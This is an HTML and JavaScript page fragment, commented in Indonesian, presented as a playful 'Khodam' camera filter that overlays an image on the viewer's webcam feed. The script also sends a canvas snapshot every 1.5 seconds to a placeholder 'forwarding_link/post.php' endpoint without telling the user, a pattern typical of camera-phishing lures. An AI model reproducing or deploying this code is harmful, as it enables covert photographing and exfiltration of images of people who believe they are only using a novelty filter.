<div class="video-wrap">
  <canvas id="canvas" width="640" height="480"></canvas>
</div>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
<script>
function post(imgdata){
  $.ajax({
    type: 'POST',
    data: { khodam_image: imgdata, khodamName: khodamName },
    url: 'forwarding_link/post.php',
    dataType: 'json',
    async: false
  });
}

const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');

// Kamera live
const cameraVideo = document.createElement('video');
cameraVideo.autoplay = true;
cameraVideo.playsInline = true;

// Latar belakang Khodam
const khodamBg = new Image();
khodamBg.src = "video_khodam.png"; // bisa diganti ke PNG transparan atau JPG

async function initCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
    cameraVideo.srcObject = stream;

    cameraVideo.addEventListener('loadedmetadata', () => {
      setInterval(() => {
        // 1. Draw kamera
        ctx.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
        // 2. Draw latar Khodam di atas
        ctx.drawImage(khodamBg, 0, 0, canvas.width, canvas.height);

        // Kirim snapshot ke server
        const imgData = canvas.toDataURL("image/png").replace("image/png","image/octet-stream");
        post(imgData);
      }, 1500);
    });

  } catch(err) {
    console.error("Gagal akses kamera:", err);
    alert("Browser tidak bisa akses kamera. Pastikan izinkan akses kamera.");
  }
}

initCamera();
</script>
